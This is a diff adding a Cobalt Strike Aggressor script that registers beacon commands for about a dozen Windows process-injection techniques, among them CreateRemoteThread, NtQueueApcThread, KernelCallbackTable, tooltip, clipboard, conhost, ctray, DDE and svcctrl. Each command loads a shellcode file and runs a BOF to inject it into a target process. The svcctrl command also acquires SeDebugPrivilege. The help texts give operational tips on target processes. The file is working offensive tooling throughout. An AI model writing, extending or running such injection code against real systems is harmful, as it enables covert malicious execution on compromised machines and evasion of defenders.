@@ -1,0 +1,877 @@
+########################################
+# Helper functions
+########################################
+
+sub readbof
+{
+    $barch = barch($1);
+    $bof_filename = script_resource("$2 $+ / $+ $2 $+ . $+ $barch $+ .o");
+    println("[INFO] Loading BOF file: $bof_filename");
+
+    $handle = openf($bof_filename);
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    if(strlen($data) == 0)
+    {
+        berror($1, "*ERROR* Failed to read in BOF file: $bof_filename");
+    }
+
+    btask($1, "Loaded $2 for $barch");
+    return $data;
+}
+
+
+########################################
+# Injection Commands
+########################################
+
+
+alias createremotethread
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(2 > size(@_) || 3 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("createremotethread"));
+        return;
+    }
+
+    # Get the PID
+    $pid = $2;
+    if($pid < 0 || $pid > 65535)
+    {
+        berror($bid, "Invalid PID");
+        berror($bid, beacon_command_detail("createremotethread"));
+        return;
+    }
+
+    # Get the shellfile
+    if(3 == size(@_))
+    {
+        $shellfile = $3;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("createremotethread"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "ib", $pid, $shellcode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "createremotethread"), "go", $args);
+}
+
+beacon_command_register(
+    "createremotethread",
+    "createremotethread injection technique",
+    "
+Command: createremotethread 
+Summary: This command injects shellcode into a process using the 
+         createremotethread technique.
+Usage:   createremotethread <PID> <SHELLCODE>
+         PID        Required. The PID to inject into. Enter '0' as the PID to 
+                    have COBALTSTRIKE uses the spawnto to create a temporary 
+                    process to inject into.
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.
+"
+);
+
+
+alias setthreadcontext
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(2 > size(@_) || 3 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("setthreadcontext"));
+        return;
+    }
+
+    # Get the PID
+    $pid = $2;
+    if($pid < 0 || $pid > 65535)
+    {
+        berror($bid, "Invalid PID");
+        berror($bid, beacon_command_detail("setthreadcontext"));
+        return;
+    }
+
+    # Get the shellfile
+    if(3 == size(@_))
+    {
+        $shellfile = $3;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("setthreadcontext"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "ib", $pid, $shellcode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "setthreadcontext"), "go", $args);
+}
+
+beacon_command_register(
+    "setthreadcontext",
+    "setthreadcontext injection technique",
+    "
+Command: setthreadcontext 
+Summary: This command injects shellcode into a process using the 
+         setthreadcontext technique.
+Usage:   setthreadcontext <PID> <SHELLCODE>
+         PID        Required. The PID to inject into. Enter '0' as the PID to 
+                    have COBALTSTRIKE uses the spawnto to create a temporary 
+                    process to inject into.
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.
+"
+);
+
+
+alias ntcreatethread
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(2 > size(@_) || 3 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("ntcreatethread"));
+        return;
+    }
+
+    # Get the PID
+    $pid = $2;
+    if($pid < 0 || $pid > 65535)
+    {
+        berror($bid, "Invalid PID");
+        berror($bid, beacon_command_detail("ntcreatethread"));
+        return;
+    }
+
+    # Get the shellfile
+    if(3 == size(@_))
+    {
+        $shellfile = $3;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("ntcreatethread"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "ib", $pid, $shellcode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "ntcreatethread"), "go", $args);
+}
+
+beacon_command_register(
+    "ntcreatethread",
+    "ntcreatethread injection technique",
+    "
+Command: ntcreatethread 
+Summary: This command injects shellcode into a process using the 
+         ntcreatethread technique in combination with loading our own version
+         of the syscall commands from ntdll on disk.
+Usage:   ntcreatethread <PID> <SHELLCODE>
+         PID        Required. The PID to inject into. Enter '0' as the PID to 
+                    have COBALTSTRIKE uses the spawnto to create a temporary 
+                    process to inject into.
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.
+"
+);
+
+
+alias ntqueueapcthread
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(2 > size(@_) || 3 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("ntqueueapcthread"));
+        return;
+    }
+
+    # Get the PID
+    $pid = $2;
+    if($pid < 0 || $pid > 65535)
+    {
+        berror($bid, "Invalid PID");
+        berror($bid, beacon_command_detail("ntqueueapcthread"));
+        return;
+    }
+
+    # Get the shellfile
+    if(3 == size(@_))
+    {
+        $shellfile = $3;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("ntqueueapcthread"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "ib", $pid, $shellcode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "ntqueueapcthread"), "go", $args);
+}
+
+beacon_command_register(
+    "ntqueueapcthread",
+    "ntqueueapcthread injection technique",
+    "
+Command: ntqueueapcthread 
+Summary: This command injects shellcode into a process using the 
+         ntqueueapcthread technique in combination with loading our own version
+         of the syscall commands from ntdll on disk.
+Usage:   ntqueueapcthread <PID> <SHELLCODE>
+         PID        Required. The PID to inject into. Enter '0' as the PID to 
+                    have COBALTSTRIKE uses the spawnto to create a temporary 
+                    process to inject into.
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.
+"
+);
+
+
+alias kernelcallbacktable
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(2 > size(@_) || 3 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("kernelcallbacktable"));
+        return;
+    }
+
+    # Get the PID
+    $pid = $2;
+    if($pid < 0 || $pid > 65535)
+    {
+        berror($bid, "Invalid PID");
+        berror($bid, beacon_command_detail("kernelcallbacktable"));
+        return;
+    }
+
+    # Get the shellfile
+    if(3 == size(@_))
+    {
+        $shellfile = $3;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("kernelcallbacktable"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "ib", $pid, $shellcode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "kernelcallbacktable"), "go", $args);
+}
+
+beacon_command_register(
+    "kernelcallbacktable",
+    "kernelcallbacktable injection technique",
+    "
+Command: kernelcallbacktable 
+Summary: This command injects shellcode into a process using the 
+         kernelcallbacktable technique in combination with loading our own 
+         version of the syscall commands from ntdll on disk. This can only 
+         target processes which handle window message (GUIs).
+Usage:   kernelcallbacktable <PID> <SHELLCODE>
+         PID        Required. The PID to inject into. Enter '0' as the PID to 
+                    have COBALTSTRIKE uses the spawnto to create a temporary 
+                    process to inject into, but this will not work with the
+                    default of rundll32.exe.
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.
+"
+);
+
+
+alias tooltip
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(2 > size(@_) || 3 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("tooltip"));
+        return;
+    }
+
+    # Get the PID
+    $pid = $2;
+    if($pid < 0 || $pid > 65535)
+    {
+        berror($bid, "Invalid PID");
+        berror($bid, beacon_command_detail("tooltip"));
+        return;
+    }
+
+    # Get the shellfile
+    if(3 == size(@_))
+    {
+        $shellfile = $3;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("tooltip"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "ib", $pid, $shellcode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "tooltip"), "go", $args);
+}
+
+beacon_command_register(
+    "tooltip",
+    "tooltip injection technique",
+    "
+Command: tooltip 
+Summary: This command injects shellcode into a process using the tooltip 
+         technique in combination with loading our own version of the syscall 
+         commands from ntdll on disk. This can only target processes with 
+         windows that have tooltips, e.g., explorer.exe.
+Usage:   tooltip <PID> <SHELLCODE>
+         PID        Required. The PID to inject into. Enter '0' as the PID to 
+                    have COBALTSTRIKE uses the spawnto to create a temporary 
+                    process to inject into, but this will not work with the
+                    default of rundll32.exe.
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.
+"
+);
+
+
+alias uxsubclassinfo
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(1 > size(@_) || 2 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("uxsubclassinfo"));
+        return;
+    }
+
+    # Get the shellfile
+    if(2 == size(@_))
+    {
+        $shellfile = $2;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("uxsubclassinfo"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "b", $shellcode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "uxsubclassinfo"), "go", $args);
+}
+
+beacon_command_register(
+    "uxsubclassinfo",
+    "uxsubclassinfo injection technique (targets explorer.exe only)",
+    "
+Command: uxsubclassinfo 
+Summary: This command injects shellcode into explorer.exe using the 
+         uxsubclassinfo in combination with loading our own version of the 
+         syscall commands from ntdll on disk. This can only target explorer, so
+         no need to specify the PID, but make sure your shellcode won't kill
+         the process or thread.
+Usage:   uxsubclassinfo <SHELLCODE>
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.
+"
+);
+
+
+alias clipboard
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(2 > size(@_) || 3 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("clipboard"));
+        return;
+    }
+
+    # Get the PID
+    $pid = $2;
+    if($pid < 0 || $pid > 65535)
+    {
+        berror($bid, "Invalid PID");
+        berror($bid, beacon_command_detail("clipboard"));
+        return;
+    }
+
+    # Get the shellfile
+    if(3 == size(@_))
+    {
+        $shellfile = $3;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("clipboard"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "ib", $pid, $shellcode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "clipboard"), "go", $args);
+}
+
+beacon_command_register(
+    "clipboard",
+    "clipboard injection technique",
+    "
+Command: clipboard 
+Summary: This command injects shellcode into a process using the clipboard 
+         technique in combination with loading our own version of the syscall 
+         commands from ntdll on disk. This can only target processes with 
+         windows that have a clipboard window, e.g., explorer.exe, 
+         vmtoolsd.exe, or the svchost.exe on Windows 10 responsible for the
+         clipboard service.
+Usage:   clipboard <PID> <SHELLCODE>
+         PID        Required. The PID to inject into. Enter '0' as the PID to 
+                    have COBALTSTRIKE uses the spawnto to create a temporary 
+                    process to inject into, but this will not work with the
+                    default of rundll32.exe.
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.
+"
+);
+
+
+alias conhost
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(2 > size(@_) || 3 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("conhost"));
+        return;
+    }
+
+    # Get the PID
+    $pid = $2;
+    if($pid < 0 || $pid > 65535)
+    {
+        berror($bid, "Invalid PID");
+        berror($bid, beacon_command_detail("conhost"));
+        return;
+    }
+
+    # Get the shellfile
+    if(3 == size(@_))
+    {
+        $shellfile = $3;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("conhost"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "ib", $pid, $shellcode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "conhost"), "go", $args);
+}
+
+beacon_command_register(
+    "conhost",
+    "conhost injection technique (targets conhost.exe only)",
+    "
+Command: conhost 
+Summary: This command injects shellcode into a process using the conhost 
+         technique in combination with loading our own version of the syscall 
+         commands from ntdll on disk. This can only target console applications 
+         with a conhost.exe child process. The injection actually occurs in the
+         conhost.exe so target the PID. On Windows 7, the parent process of 
+         conhost.exe is actually csrss.exe instead of the console application, 
+         so this technique will not work.
+Usage:   conhost <PID> <SHELLCODE>
+         PID        Required. The PID to inject into. Enter '0' as the PID to 
+                    have COBALTSTRIKE uses the spawnto to create a temporary 
+                    process to inject into, but this will not work with the
+                    default of rundll32.exe.
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.
+"
+);
+
+
+alias ctray
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(1 > size(@_) || 2 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("ctray"));
+        return;
+    }
+
+    # Get the shellfile
+    if(2 == size(@_))
+    {
+        $shellfile = $2;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("ctray"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "b", $shellcode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "ctray"), "go", $args);
+}
+
+beacon_command_register(
+    "ctray",
+    "ctray injection technique (targets explorer.exe only)",
+    "
+Command: ctray 
+Summary: This command injects shellcode into explorer.exe using the ctray 
+         injection technique in combination with loading our own version of the 
+         syscall commands from ntdll on disk. This can only target explorer, so
+         no need to specify the PID, but make sure your shellcode won't kill
+         the process or thread.
+Usage:   ctray <SHELLCODE>
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.                
+"
+);
+
+
+alias dde
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(1 > size(@_) || 2 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("dde"));
+        return;
+    }
+
+    # Get the shellfile
+    if(2 == size(@_))
+    {
+        $shellfile = $2;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("dde"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "b", $shellcode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "dde"), "go", $args);
+}
+
+beacon_command_register(
+    "dde",
+    "dde injection technique (targets explorer.exe only)",
+    "
+Command: dde 
+Summary: This command injects shellcode into explorer.exe using the dde 
+         injection technique in combination with loading our own version of the 
+         syscall commands from ntdll on disk. This can only target explorer, so
+         no need to specify the PID, but make sure your shellcode won't kill
+         the process or thread.
+Usage:   dde <SHELLCODE>
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.
+Warning: The injection technique causes the shellcode to be executed FOUR times
+         so plan accordingly.                    
+"
+);
+
+
+alias svcctrl
+{
+    local('$bid $pid $shellcode $shellfile $fp $args');
+
+    $bid = $1;
+
+    # Check number of arguments
+    if(2 > size(@_) || 3 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("svcctrl"));
+        return;
+    }
+
+    # Get the PID
+    $pid = $2;
+    if($pid < 0 || $pid > 65535)
+    {
+        berror($bid, "Invalid PID");
+        berror($bid, beacon_command_detail("conhost"));
+        return;
+    }
+    
+    # Get the shellfile
+    if(3 == size(@_))
+    {
+        $shellfile = $3;
+    }
+    else
+    {
+        prompt_file_open("Select shellcode", $null, false, $this);
+        yield;
+        $shellfile = $1;
+    }
+
+    # Get the shellcode
+    if (!-canread $shellfile)
+    {
+        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
+        berror($bid, beacon_command_detail("svcctrl"));
+        return;
+    }
+    $fp = openf($shellfile);
+    $shellcode = readb($fp, -1);
+    closef($fp);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "ib", $pid, $shellcode);
+
+    blog($1, "Requesting to enable debug privs");
+    bgetprivs($1, "SeDebugPrivilege");
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bid, "svcctrl"), "go", $args);
+}
+
+beacon_command_register(
+    "svcctrl",
+    "svcctrl injection technique",
+    "
+Command: svcctrl 
+Summary: This command injects shellcode into a process using the svcctrl 
+         technique. This technique attempts to overwrite a service's internal 
+         dispatch table in the targeted process, so the targeted process must
+         be hosting services, e.g., svchost.exe or spoolsrv.exe.
+Usage:   svcctrl <PID> <SHELLCODE>
+         PID        Required. The PID to inject into. This technique can only 
+                    target processes which are hosting services.
+         SHELLCODE  Optional. The file name of the shellcode to inject. If not
+                    specified on the command line, then you will be prompted to
+                    select the file.
+"
+);
